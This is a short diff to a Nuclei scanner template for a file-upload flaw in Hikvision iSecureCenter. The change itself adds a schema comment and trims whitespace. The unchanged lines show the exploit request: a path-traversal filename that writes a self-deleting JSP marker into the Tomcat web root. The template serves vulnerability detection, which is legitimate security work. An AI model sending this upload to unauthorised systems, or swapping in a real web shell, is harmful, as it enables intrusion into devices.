@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: hikvision-iSecureCenter-upload
 
 info:
@@ -29,7 +30,7 @@ http:
         Connection: close
 
         ------WebKitFormBoundaryOKldnDPT
-        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}" 
+        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}"
         Content-Type: application/octet-stream
 
         <% out.print(11111*22222);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
